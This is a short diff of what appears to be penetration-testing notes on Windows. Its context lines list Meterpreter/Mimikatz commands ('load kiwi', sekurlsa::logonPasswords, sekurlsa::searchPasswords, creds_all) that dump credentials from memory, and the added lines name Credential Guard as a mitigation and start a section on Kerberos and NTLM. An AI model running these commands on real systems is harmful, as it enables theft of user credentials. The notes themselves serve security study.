@@ -94,6 +94,10 @@ load kiwi
 -> mimikatz_command -f sekurlsa::logonPasswords
 -> mimikatz_command -f sekurlsa::searchPasswords
 -> creds_all
+Mitigation : Windows Defender Credential Guard
+
+Windows Authentication
+Basically, Kerberos and NTLM Challange & Response authentication mechanisms are used in Windows environment.
 
 
 
